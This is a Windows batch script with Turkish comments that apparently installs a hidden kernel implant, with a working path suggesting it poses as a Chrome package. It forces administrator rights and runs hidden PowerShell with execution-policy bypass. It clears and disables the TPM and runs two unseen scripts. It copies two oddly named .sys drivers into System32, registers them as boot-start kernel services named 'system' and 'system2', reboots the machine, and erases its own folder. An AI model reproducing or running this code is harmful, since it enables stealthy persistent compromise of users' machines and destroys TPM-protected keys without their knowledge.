@echo off
setlocal

:: Yönetici izni kontrolü
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: Çalışma dizinini al (örnek: C:\Users\User\AppData\Local\Temp\CHROME_ABC123\)
set "WORKDIR=%~dp0"

:: TPM ayarları
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Clear-Tpm'"

:: 1.ps1 ve 2.ps1'i doğru konumdan çalıştır
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%WORKDIR%1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%WORKDIR%2.ps1\"'"

:: Dosyaları System32'ye kopyala
set "sys32Dir=C:\Windows\System32"

if exist "%WORKDIR%53259239.sys" (
    copy /y "%WORKDIR%53259239.sys" "%sys32Dir%"
)
if exist "%WORKDIR%86436432.sys" (
    copy /y "%WORKDIR%86436432.sys" "%sys32Dir%"
)

:: Servisleri oluştur
sc create system binPath= "C:\Windows\System32\53259239.sys" DisplayName= "system" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "system2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: Servisleri başlat
sc start system
sc start system2

:: 2 saniyede yeniden başlat
shutdown /r /t 2

:: Kendi bulunduğu klasörü temizle
cd /d "%WORKDIR%"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"

exit
